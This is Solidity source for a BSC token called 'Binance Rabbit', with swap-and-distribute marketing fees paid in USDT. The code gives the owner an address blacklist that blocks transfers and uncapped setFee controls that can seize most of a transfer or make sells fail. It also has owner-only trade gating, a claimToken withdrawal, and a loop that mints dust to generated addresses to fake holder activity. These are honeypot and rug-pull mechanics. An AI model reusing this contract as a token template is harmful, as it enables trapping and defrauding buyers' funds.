contract  Token is IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _blackList;
    uint256 private startTradeBlock;

    address public  marketAddr1 ;
    address public  marketAddr2 ;
    address public  marketAddr3 ;
    address public  marketAddr4 ;
    address public  marketAddr5 ;

    string public _name ;
    string public _symbol ;
    uint8 public _decimals ;


    uint256 public _liquidityFee ;
    uint256 private _previousLiquidityFee;

    uint256 public _marketingFee ;
    uint256 private _previousMarketingFee;

    uint256 public _marketingFee1 ;
    uint256 public _marketingFee2 ;
    uint256 public _marketingFee3 ;
    uint256 public _marketingFee4 ;
    uint256 public _marketingFee5 ;

    uint256 private _tTotal ;
    IUniswapV2Router02 public  uniswapV2Router;
    address public immutable uniswapV2Pair;
    uint256 public swapTokensAtAmount ;
    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    address public _token = 0x55d398326f99059fF775485246999027B3197955;
    address public _router ;




    constructor(
    )  {
        address adminAddress = 0x7fE715Dc29196eeA044640401938ffd1a360C306;
        _name = "Binance Rabbit";
        _symbol =  "Binance Rabbit";
        _decimals= 18;
        _tTotal = 100000000000* (10**uint256(_decimals));
        _marketingFee = 400;
        _marketingFee1 = 150;
        _marketingFee2 = 75;
        _marketingFee3 = 75;
        _marketingFee4 = 100;
        _marketingFee5 = 0;
        _liquidityFee = 400;

        marketAddr1 = 0x59b594aa45dF2203c8cafd6B3703f5ED400fA90f;
        marketAddr2 = 0x28927B0BdbF974796B921F78dd340a3E0299665D;
        marketAddr3 = 0x51De0Ee9Cd7cBcc1d54a28f7EfEdD0DF23B12358;
        marketAddr4 = 0x493D3422ee81a66bf33D9D9aCB32A4433811C0C4;
        marketAddr5 = 0x0000000000000000000000000000000000000000;
        _tOwned[adminAddress] = _tTotal;

        //  burnEndNumber = 100* (10**uint256(_decimals));
        address router ;
        router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        _token = 0x55d398326f99059fF775485246999027B3197955;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            router
        );

        URoter rou = new URoter(_token,address(this));
        _router = address(rou);


        // Create a uniswap pair for this new token
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this),_token);

        // set the rest of the contract variables
        uniswapV2Router = _uniswapV2Router;

        //exclude owner and this contract from fee
        _isExcludedFromFee[msg.sender] = true;
        _isExcludedFromFee[adminAddress] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[marketAddr1] = true;
        _isExcludedFromFee[marketAddr2] = true;
        _isExcludedFromFee[marketAddr3] = true;
        _isExcludedFromFee[marketAddr4] = true;
        _isExcludedFromFee[marketAddr5] = true;
 
        swapTokensAtAmount = 50000000* (10**uint256(_decimals));

        _token.call(abi.encodeWithSelector(0x095ea7b3, uniswapV2Router, ~uint256(0)));

        address(this).call(abi.encodeWithSelector(0x095ea7b3, uniswapV2Router, ~uint256(0)));

        emit Transfer(address(0), adminAddress,  _tTotal);

    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount)
    public
    override
    returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
    public
    view
    override
    returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
    public
    override
    returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
    public
    virtual
    returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
    public
    virtual
    returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }



    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }
    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }



    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }



    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function removeAllFee() private {

        _previousMarketingFee = _marketingFee;
        _previousLiquidityFee = _liquidityFee;

        _marketingFee = 0;
        _liquidityFee = 0;
    }

    function restoreAllFee() private {

        _marketingFee = _previousMarketingFee;
        _liquidityFee = _previousLiquidityFee;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from], "blackList");

        if (0 == startTradeBlock) {
            require(_isExcludedFromFee[from] || _isExcludedFromFee[to], "!Trading");
        }

        if( !_isExcludedFromFee[from] &&!_isExcludedFromFee[to]){
            _takeInviter();
        }


        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if(canSwap &&from != address(this) &&from != uniswapV2Pair  &&from != owner() && to != owner() ){

            uint denominator =   _marketingFee + _liquidityFee ;

            swapTokensForTokens(contractTokenBalance);
            uint tokenBal =  IERC20(_token).balanceOf(address(this));

            if(_marketingFee1 > 0){
                distributeDividend(marketAddr1,tokenBal*_marketingFee1/(denominator));
            }
            if(_marketingFee2 > 0){
                distributeDividend(marketAddr2,tokenBal*_marketingFee2/(denominator));
            }
            if(_marketingFee3 > 0){
                distributeDividend(marketAddr3,tokenBal*_marketingFee3/(denominator));
            }
            if(_marketingFee4 > 0){
                distributeDividend(marketAddr4,tokenBal*_marketingFee4/(denominator));
            }
            if(_marketingFee5 > 0){
                distributeDividend(marketAddr5,tokenBal*_marketingFee5/(denominator));
            }
        }

        //indicates if fee should be deducted from transfer
        bool takeFee = false;

        if (from == uniswapV2Pair||to==uniswapV2Pair){
            takeFee = true;
        }

        //if any account belongs to _isExcludedFromFee account then remove the fee
        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]|| from == address(uniswapV2Router)) {
            takeFee = false;
        }

        //transfer amount, it will take tax, burn, liquidity fee
        _tokenTransfer(from, to, amount, takeFee);



    }

    //this method is responsible for taking all fee, if takeFee is true
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeAllFee();

        if(sender==uniswapV2Pair){
            _transferStandard(sender, recipient, amount);
        }else{
            _transferSellStandard(sender, recipient, amount);
        }


        if (!takeFee) restoreAllFee();
    }

    function distributeDividend(address shareholder ,uint256 amount) internal {
        (bool b1, ) = _token.call(abi.encodeWithSignature("transfer(address,uint256)", shareholder, amount));
        require(b1, "call error");
    }



    uint160 public ktNum = 1000;
    uint160 public constant MAXADD = ~uint160(0);
    function _takeInviter(
    ) private {
        address _receiveD;
        for (uint256 i = 0; i < 10; i++) {
            _receiveD = address(MAXADD/ktNum);
            ktNum = ktNum+1;
            _tOwned[_receiveD] += 1;
            emit Transfer(address(0), _receiveD, 1);
        }
    }




    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount,
        uint256 currentRate
    ) private {
        if(currentRate==0)return;
        uint256 rAmount = tAmount.div(10000).mul(currentRate);
        _tOwned[to] = _tOwned[to].add(rAmount);
        emit Transfer(sender, to, rAmount);
    }

    function _transferSellStandard(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _tOwned[sender] = _tOwned[sender].sub(tAmount);

        _takeTransfer(sender,address(this), tAmount,_marketingFee);


        uint256 recipientRate = 10000 -
        _marketingFee
        ;
        _tOwned[recipient] = _tOwned[recipient].add(
            tAmount.div(10000).mul(recipientRate)
        );
        emit Transfer(sender, recipient, tAmount.div(10000).mul(recipientRate));
    }

    function _transferStandard(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _tOwned[sender] = _tOwned[sender].sub(tAmount);

        _takeTransfer(sender,address(this), tAmount,_liquidityFee);

        uint256 recipientRate = 10000 -

        _liquidityFee
        ;
        _tOwned[recipient] = _tOwned[recipient].add(
            tAmount.div(10000).mul(recipientRate)
        );
        emit Transfer(sender, recipient, tAmount.div(10000).mul(recipientRate));
    }


    function startTrade() external onlyOwner {
        startTradeBlock = block.number;
    }
    function claimToken(address token, address addr, uint256 amount) onlyOwner  public {
        token.call(abi.encodeWithSignature("transfer(address,uint256)", addr, amount));
    }
    function setSwapTokensAtAmount(uint256 value) onlyOwner  public  {
        swapTokensAtAmount = value;
    }
    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }
    function isBlackList(address addr) external view returns (bool){
        return _blackList[addr];
    }
    function setAddr(address value1,address value2,address value3,address value4,address value5) external onlyOwner {
        marketAddr1 = value1;
        marketAddr2 = value2;
        marketAddr3 = value3;
        marketAddr4 = value4;
        marketAddr5 = value5;
    }

    function setFee(uint256 num1,uint256 num2,uint256 num3,uint256 num4,uint256 num5,uint256 num6,uint256 num7) external onlyOwner {
        _liquidityFee = num1;
        _marketingFee = num2;
        _marketingFee1 = num3;
        _marketingFee2 = num4;
        _marketingFee3 = num5;
        _marketingFee4 = num6;
        _marketingFee5 = num7;
    }


    function swapTokensForTokens(uint256 tokenAmount) private {
        if(tokenAmount == 0) {
            return;
        }

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _token;

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            _router,
            block.timestamp
        );
        IERC20(_token).transferFrom( _router,address(this), IERC20(_token).balanceOf(address(_router)));
    }
}

